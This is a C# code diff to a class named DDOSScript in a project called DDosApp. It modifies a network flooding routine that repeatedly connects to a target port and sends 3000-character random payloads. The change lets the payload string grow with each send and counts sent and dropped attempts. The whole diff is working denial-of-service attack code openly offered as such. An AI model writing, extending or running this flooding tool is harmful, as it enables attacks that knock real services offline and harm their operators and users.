@@ -14,6 +14,7 @@ namespace DDosApp.DDoS_Scripts
     internal static class DDOSScript
     { 
         public static int counter = 0;
+        public static string OldStr = null;
         public static Random seed = new Random();
 
         // Http Download
@@ -83,11 +84,14 @@ namespace DDosApp.DDoS_Scripts
                 try
                 {
                     sender.ConnectAsync(port).Wait(timeout);
-                    sender.Send(Encoding.ASCII.GetBytes(RandomString(3000)));
+                    sender.Send(Encoding.ASCII.GetBytes(RandomString(3000, ref OldStr)));
                     sender.Close();
+                    counter++;
                 }
                 catch (Exception)
                 {
+                    counter++;
+
                     Console.ForegroundColor = ConsoleColor.Red;
                     Console.WriteLine($"[ERROR {DateTime.Now}] The task is dropped {counter}.");
 
@@ -99,10 +103,10 @@ namespace DDosApp.DDoS_Scripts
             });
         }
 
-        private static string RandomString(int length)
+        private static string RandomString(int length, ref string old_string)
         {
             const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-            return new string(Enumerable.Repeat(chars, length)
+            return old_string + new string(Enumerable.Repeat(chars, length)
                 .Select(s => s[seed.Next(s.Length)]).ToArray());;
         }
     }
